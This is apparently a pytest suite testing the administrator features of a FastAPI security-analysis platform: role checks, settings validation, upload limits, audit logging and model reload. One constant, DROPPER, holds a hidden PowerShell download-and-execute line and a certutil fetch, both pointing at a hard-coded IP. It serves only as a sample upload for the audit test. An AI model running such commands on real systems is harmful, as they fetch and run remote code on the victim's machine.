"""Milestone 4: the Administrator role (users/roles, settings/policies, integrations,
activity monitoring, model management) and self-service profile management."""

import io

import pytest
from fastapi.testclient import TestClient

from app.core.runtime_settings import runtime_settings
from app.main import app
from app.modules.users.service import LastAdministratorError, UserService

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)


def _h(email="admin@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


@pytest.fixture(autouse=True)
def _clean_settings():
    runtime_settings.reset()
    yield
    runtime_settings.reset()


# --- access control ------------------------------------------------------------

ADMIN_GETS = [
    "/api/v1/admin/overview",
    "/api/v1/admin/users",
    "/api/v1/admin/settings",
    "/api/v1/admin/integrations",
    "/api/v1/admin/audit",
    "/api/v1/admin/models",
]


@pytest.mark.parametrize("path", ADMIN_GETS)
def test_admin_endpoints_reject_every_other_role(path):
    for email in ("analyst@local", "soc@local", "researcher@local"):
        assert client.get(path, headers=_h(email)).status_code == 403
    assert client.get(path).status_code == 401
    assert client.get(path, headers=_h("admin@local")).status_code == 200


# --- platform monitor ------------------------------------------------------------

def test_overview_reports_platform_health():
    body = client.get("/api/v1/admin/overview", headers=_h()).json()
    assert body["auth_mode"] == "dev-login"
    assert body["persistence"] == "in-memory"
    assert body["requests"]["total_requests"] >= 1
    assert body["totals"]["users"] >= 4
    assert "detector" in body["models"]
    # dev defaults are flagged so nobody deploys them by accident
    assert any("JWT_SECRET_KEY" in w for w in body["warnings"])
    assert any("dev login" in w for w in body["warnings"])


# --- users and roles ---------------------------------------------------------------

def test_admin_can_list_users_and_change_a_role_which_applies_at_next_sign_in():
    users = client.get("/api/v1/admin/users", headers=_h()).json()
    assert {u["email"] for u in users} >= {
        "analyst@local", "soc@local", "admin@local", "researcher@local"
    }

    try:
        resp = client.patch(
            "/api/v1/admin/users/researcher@local/role",
            json={"role": "SOC Team Member"},
            headers=_h(),
        )
        assert resp.status_code == 200 and resp.json()["role"] == "SOC Team Member"
        # the role is read from the token, so it takes effect on the next sign-in
        me = client.get("/api/v1/users/me", headers=_h("researcher@local")).json()
        assert me["role"] == "SOC Team Member"
    finally:
        client.patch(
            "/api/v1/admin/users/researcher@local/role",
            json={"role": "Researcher"},
            headers=_h(),
        )
    assert client.get("/api/v1/users/me", headers=_h("researcher@local")).json()["role"] == "Researcher"


def test_role_change_validation():
    h = _h()
    assert client.patch("/api/v1/admin/users/admin@local/role", json={"role": "Researcher"}, headers=h).status_code == 400
    assert client.patch("/api/v1/admin/users/soc@local/role", json={"role": "Overlord"}, headers=h).status_code == 422
    assert client.patch("/api/v1/admin/users/nobody@local/role", json={"role": "Researcher"}, headers=h).status_code == 404
    assert client.patch(
        "/api/v1/admin/users/soc@local/role", json={"role": "Researcher"}, headers=_h("analyst@local")
    ).status_code == 403


def test_the_last_administrator_cannot_be_demoted():
    svc = UserService()
    with pytest.raises(LastAdministratorError):
        svc.set_role("admin@local", "Researcher")
    svc.set_role("analyst@local", "Administrator")  # a second admin ...
    svc.set_role("admin@local", "Researcher")  # ... makes the demotion legal


def test_new_dev_users_appear_in_the_directory_after_signing_in():
    _h("newhire@example.org")
    emails = {u["email"] for u in client.get("/api/v1/admin/users", headers=_h()).json()}
    assert "newhire@example.org" in emails


# --- settings and security policies ----------------------------------------------

def test_settings_are_editable_validated_and_reversible():
    h = _h()
    fields = client.get("/api/v1/admin/settings", headers=h).json()["fields"]
    assert {f["key"] for f in fields} >= {
        "ALERT_MIN_LEVEL", "RATE_LIMIT_PER_MINUTE", "LOGIN_RATE_LIMIT_PER_MINUTE",
        "JWT_ACCESS_TOKEN_EXPIRE_MINUTES", "MAX_UPLOAD_MB",
    }

    resp = client.put("/api/v1/admin/settings", json={"values": {"ALERT_MIN_LEVEL": "medium"}}, headers=h)
    assert resp.status_code == 200
    assert resp.json()["applied"] == {"ALERT_MIN_LEVEL": "medium"}
    assert runtime_settings.get("ALERT_MIN_LEVEL") == "medium"

    reset = client.post("/api/v1/admin/settings/reset", headers=h).json()
    assert next(f for f in reset["fields"] if f["key"] == "ALERT_MIN_LEVEL")["value"] == "high"


@pytest.mark.parametrize(
    "values",
    [
        {"ALERT_MIN_LEVEL": "bogus"},
        {"RATE_LIMIT_PER_MINUTE": 1},
        {"MAX_UPLOAD_MB": 100000},
        {"MAX_UPLOAD_MB": "lots"},
        {"JWT_SECRET_KEY": "pwned"},  # secrets are never editable
        {"SUPABASE_URL": "http://evil"},
    ],
)
def test_invalid_or_forbidden_settings_are_rejected(values):
    resp = client.put("/api/v1/admin/settings", json={"values": values}, headers=_h())
    assert resp.status_code == 422


def test_upload_limit_policy_is_enforced():
    h = _h()
    client.put("/api/v1/admin/settings", json={"values": {"MAX_UPLOAD_MB": 1}}, headers=h)
    big = b"A" * (1024 * 1024 + 1)
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("big.bin", io.BytesIO(big), "application/octet-stream")},
        headers=_h("analyst@local"),
    )
    assert resp.status_code == 413
    assert "1 MB" in resp.json()["detail"]


def test_session_lifetime_policy_applies_to_new_tokens():
    from jose import jwt

    from app.core.config import settings

    client.put(
        "/api/v1/admin/settings",
        json={"values": {"JWT_ACCESS_TOKEN_EXPIRE_MINUTES": 5}},
        headers=_h(),
    )
    token = client.post("/api/v1/auth/login", json={"email": "soc@local", "password": "x"}).json()["access_token"]
    claims = jwt.decode(token, settings.JWT_SECRET_KEY, algorithms=[settings.JWT_ALGORITHM])
    from datetime import datetime, timezone

    remaining = claims["exp"] - datetime.now(timezone.utc).timestamp()
    assert 0 < remaining <= 5 * 60 + 5


# --- integrations --------------------------------------------------------------------

def test_integrations_status_and_tests():
    h = _h()
    items = {i["id"]: i for i in client.get("/api/v1/admin/integrations", headers=h).json()}
    assert set(items) == {"virustotal", "email", "siem", "supabase"}
    assert items["siem"]["configured"] is False and items["siem"]["testable"] is True
    assert "key" not in str(items).lower().replace("virustotal_api_key", "")  # no secrets leak

    siem = client.post("/api/v1/admin/integrations/siem/test", headers=h).json()
    assert siem["ok"] is False and "not configured" in siem["error"]
    assert client.post("/api/v1/admin/integrations/email/test", headers=h).json()["ok"] is False
    assert client.post("/api/v1/admin/integrations/virustotal/test", headers=h).status_code == 404


# --- activity log -----------------------------------------------------------------------

def test_activity_is_audited_and_filterable():
    h = _h()
    client.patch("/api/v1/admin/users/soc@local/role", json={"role": "SOC Team Member"}, headers=h)
    client.put("/api/v1/admin/settings", json={"values": {"ALERT_MIN_LEVEL": "medium"}}, headers=h)
    client.post(
        "/api/v1/files/upload",
        files={"file": ("audit-me.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=_h("analyst@local"),
    )
    bad = client.post("/api/v1/auth/login", json={"email": "", "password": "x"})
    assert bad.status_code in (200, 401, 422)

    events = client.get("/api/v1/admin/audit", params={"limit": 500}, headers=h).json()
    actions = {e["action"] for e in events}
    assert {"auth.login", "settings.update", "scan.upload"} <= actions

    scans = client.get("/api/v1/admin/audit", params={"action": "scan"}, headers=h).json()
    assert scans and all(e["action"].startswith("scan") for e in scans)
    upload = next(e for e in scans if e["action"] == "scan.upload" and "audit-me.bin" in (e["detail"] or ""))
    assert upload["actor"] == "analyst@local"
    assert upload["role"] == "Security Analyst"

    mine = client.get("/api/v1/admin/audit", params={"actor": "analyst@local"}, headers=h).json()
    assert mine and all(e["actor"] == "analyst@local" for e in mine)

    csv_resp = client.get("/api/v1/admin/audit/export.csv", headers=h)
    assert csv_resp.status_code == 200
    assert csv_resp.text.splitlines()[0] == "at,actor,role,action,target,detail,status,ip"


# --- model management --------------------------------------------------------------------

def test_model_management_status_and_hot_reload():
    h = _h()
    body = client.get("/api/v1/admin/models", headers=h).json()
    assert body["registry"]["detector"]["version"]
    assert "retrain_recommended" in body["feedback"]
    reloaded = client.post("/api/v1/admin/models/reload", headers=h)
    assert reloaded.status_code == 200
    assert reloaded.json()["registry"]["detector"]["version"] == body["registry"]["detector"]["version"]
    assert any(e["action"] == "model.reload" for e in client.get("/api/v1/admin/audit", headers=h).json())


# --- profile management ----------------------------------------------------------------------

def test_users_can_edit_their_display_name():
    h = _h("soc@local")
    assert client.get("/api/v1/users/me", headers=h).json()["display_name"] in (None, "Dana")
    resp = client.patch("/api/v1/users/me", json={"display_name": "  Dana  "}, headers=h)
    assert resp.status_code == 200 and resp.json()["display_name"] == "Dana"
    assert client.get("/api/v1/users/me", headers=h).json()["display_name"] == "Dana"
    assert client.patch("/api/v1/users/me", json={"display_name": ""}, headers=h).status_code == 422
    assert client.patch("/api/v1/users/me", json={"display_name": "x" * 61}, headers=h).status_code == 422
    # visible to the administrator
    listed = {u["email"]: u for u in client.get("/api/v1/admin/users", headers=_h()).json()}
    assert listed["soc@local"]["display_name"] == "Dana"
